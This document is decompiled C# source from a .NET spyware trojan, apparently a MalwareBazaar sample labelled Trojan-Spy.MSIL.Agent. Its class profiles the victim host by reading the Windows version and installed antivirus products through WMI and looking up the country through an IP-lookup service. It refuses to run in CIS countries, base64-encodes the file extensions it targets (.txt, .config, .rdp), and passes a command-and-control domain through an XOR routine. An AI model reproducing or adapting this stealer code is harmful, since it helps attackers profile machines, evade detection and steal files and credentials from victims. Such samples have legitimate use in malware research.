// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.velelyifanar
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.Collections.Generic;
using System.Management;
using System.Net;
using System.Text;
using System.Xml;

namespace AlphaCentavr
{
  internal class velelyifanar
  {
    public static string grsaauto = "834552";
    public static readonly string yupi = velelyifanar.hyga();
    public static readonly string HWID = Identification.YHLWD();
    public static readonly string Ali = velelyifanar.Av();
    public static readonly string OS = velelyifanar.GetWindowsVersion();
    public static readonly string COU = velelyifanar.Countr();
    public static readonly string searche = "1";
    public static int reper = 250000;
    public static string[] lubasha = new string[4]
    {
      velelyifanar.rekaiberega("LnR4dA=="),
      velelyifanar.rekaiberega("LmNvbmZpZw=="),
      "",
      velelyifanar.rekaiberega("LnJkcA==")
    };

    public static void XOREncipher(ref byte[] Data, byte[] PasswordBytes)
    {
      if (Data == null && PasswordBytes == null)
        return;
      int index1 = 0;
      int index2 = 0;
      while (index2 < Data.Length)
      {
        Data[index2] = checked ((byte) ((int) Data[index2] ^ (int) PasswordBytes[index1]));
        checked { ++index1; }
        if (index1 >= PasswordBytes.Length)
          index1 = 0;
        checked { ++index2; }
      }
    }

    public static string GetWindowsVersion()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = managementBaseObject["Caption"].ToString();
      if (empty.Contains("8"))
        return "Windows 8";
      if (empty.Contains("8.1"))
        return "Windows 8.1";
      if (empty.Contains("10"))
        return "Windows 10";
      if (empty.Contains("11"))
        return "Windows 11";
      if (empty.Contains("XP"))
        return "Windows XP";
      if (empty.Contains("7"))
        return "Windows 7";
      return !empty.Contains("Server") ? "Unknown" : "Windows Server";
    }

    public static string OSA()
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
      {
        try
        {
          return (string) managementObject["Version"];
        }
        catch
        {
        }
      }
      return "BIOS Maker: Unknown";
    }

    public static string Av()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
      string str1 = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      {
        string str2 = (string) managementBaseObject["displayName"];
        str1 = str1 + str2 + ", ";
      }
      return str1;
    }

    public static string Countr()
    {
      string str = string.Empty;
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.LoadXml(velelyifanar.GetSourceXml(velelyifanar.rekaiberega("aHR0cDovL2lwd2hvaXMuYXBwL3htbC8=")));
        str = xmlDocument.GetElementsByTagName("country")[0].InnerText;
      }
      catch
      {
      }
      return str;
    }

    public static string hyga()
    {
      string s = "https://blguard.shop/";
      byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
      velelyifanar.XOREncipher(ref bytes, new byte[1]
      {
        (byte) 200
      });
      Console.WriteLine(Encoding.GetEncoding(1251).GetString(bytes));
      velelyifanar.XOREncipher(ref bytes, new byte[1]
      {
        (byte) 200
      });
      return Encoding.GetEncoding(1251).GetString(bytes);
    }

    private static string rekaiberega(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    private static string Info
    {
      get
      {
        string info = string.Empty;
        try
        {
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.LoadXml(velelyifanar.GetSourceXml(velelyifanar.rekaiberega("aHR0cDovL2lwd2hvaXMuYXBwL3htbC8=")));
          info = xmlDocument.GetElementsByTagName("country")[0].InnerText;
        }
        catch
        {
        }
        return info;
      }
    }

    public static bool Inizialize()
    {
      List<string> stringList = new List<string>();
      stringList.Add("Armenia");
      stringList.Add("Azerbaijan");
      stringList.Add("Belarus");
      stringList.Add("Kazakhstan");
      stringList.Add("Kyrgyzstan");
      stringList.Add("Moldova");
      stringList.Add("Tajikistan");
      stringList.Add("Uzbekistan");
      stringList.Add("Ukraine");
      stringList.Add("Russia");
      stringList.Sort();
      foreach (string str in stringList)
      {
        if (velelyifanar.Info.Contains(str))
          return true;
      }
      return false;
    }

    private static string GetSourceXml(string url)
    {
      string sourceXml = string.Empty;
      try
      {
        Uri address = new Uri(url, UriKind.Absolute);
        using (WebClient webClient = new WebClient())
          sourceXml = webClient.DownloadString(address);
      }
      catch
      {
      }
      return sourceXml;
    }
  }
}
